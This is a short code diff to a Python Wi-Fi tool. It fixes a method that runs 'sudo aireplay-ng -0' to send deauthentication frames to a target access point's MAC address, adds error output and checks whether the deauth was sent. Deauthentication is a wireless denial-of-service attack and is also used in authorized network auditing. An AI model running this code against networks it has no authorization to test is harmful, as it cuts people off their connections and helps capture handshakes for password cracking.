@@ -42,9 +42,13 @@ class bssid:
         if not interface.channel == self.channel:
             self.configure_interface(interface)
         print(f"DeAuthing {self.MAC} {self.channel} on interface {interface.interface}")
+        out=None
         try:
-            subprocess.check_output(["sudo","aireplay-ng", "-0", amount, "-a", self.MAC, interface.interface])
-        except:
-            print(f"DeAuth on {self.MAC} {self.channel} on interface {interface.interface} Failed!")
+            out=subprocess.check_output(["sudo","aireplay-ng", "-0", str(amount), "-a", self.MAC, interface.interface])
+        except Exception as e:
+            print(f"DeAuth on {self.MAC} {self.channel} on interface {interface.interface} Failed!\n{e}")
+        if out:
+            if f"Sending DeAuth (code 7) to broadcast" in out.decode():
+                print("DeAuth Sent!")
         return interface
     
